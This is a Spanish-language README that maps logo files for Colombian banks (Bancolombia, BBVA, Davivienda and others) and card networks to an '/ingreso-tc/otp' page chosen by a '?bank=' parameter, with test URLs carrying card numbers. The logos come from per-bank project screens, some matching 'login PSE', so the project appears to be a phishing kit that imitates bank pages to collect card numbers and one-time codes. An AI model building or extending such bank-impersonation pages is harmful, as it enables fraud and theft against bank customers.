# Logos ingreso TC

Los JSX cargan estas carpetas con `require.context` (ruta `../img/` desde `Otp/` y `Dinamica/`).

## `bancos/`

Un archivo por banco (`.svg`, `.webp` o `.png`). El nombre del archivo (sin extensión) es la clave de `?bank=`.

| Archivo | Origen en pantallas del proyecto |
|---------|----------------------------------|
| `avvillas.svg` | `bancoAvVillas/img/logo-avvillas.svg` |
| `bancolombia.svg` | `public/.../logo-bancolombia-black.svg` |
| `bbva.webp` | `bancoBbvaColombia/img/Logo-BBVA.webp` |
| `bogota.png` | `bancoBogota/img/logo_bancobogota.png` (mismo que login PSE) |
| `cajasocial.svg` | `bancoCajaSocial/img/logo_banco_fundacion.svg` (mismo que login PSE) |
| `colpatria.svg` | `bancoColpatria/img/new-brand-red.svg` |
| `davivienda.png` | Logo para fondo claro (lo agregas tú en `img/bancos/`) |
| `falabella.png` | Logo Falabella (`img/bancos/falabella.png`) |
| `itau.png` | `bancoItau/img/itau_logo_naranja.png` (logo naranja PSE) |
| `nequi.svg` | `bancoNequi/images/nequi-logo.svg` |
| `occidente.svg` | `bancoOccidente/img/logo-occidente.svg` |
| `popular.png` | Logo Banco Popular (`img/bancos/popular.png`) |
| `serfinanza.png` | `bancoSerfinanza/img/imgi_1_logo2.png` |

Los que venían solo en PNG/WebP usan el raster original (no SVG con imagen embebida en base64).

### Prueba

```
/ingreso-tc/otp?bank=bancolombia&tarjeta=4111111111111111
/ingreso-tc/otp?bank=bbva&tarjeta=4111111111111111
/ingreso-tc/otp?bank=cajasocial&tarjeta=4111111111111111
/ingreso-tc/otp?bank=bogota&tarjeta=4111111111111111
/ingreso-tc/otp?bank=davivienda&tarjeta=5111111111111111
/ingreso-tc/otp?bank=itau&tarjeta=371111111111111
```

## `franquicias/`

El logo se elige por **BIN** del número de tarjeta:

| Franquicia | BIN |
|------------|-----|
| Visa | empieza en **4** |
| Mastercard | empieza en **5** o **2** |
| Amex | empieza en **34** o **37** |
| Diners | empieza en **30**, **31**, **32**, **36**, **38** |
| ID Check (resto) | cualquier otro BIN con número de tarjeta presente |

```
franquicias/visa.png
franquicias/mastercard.png
franquicias/amex.png
franquicias/dinersclub.png
franquicias/idcheckgeneral.png
```
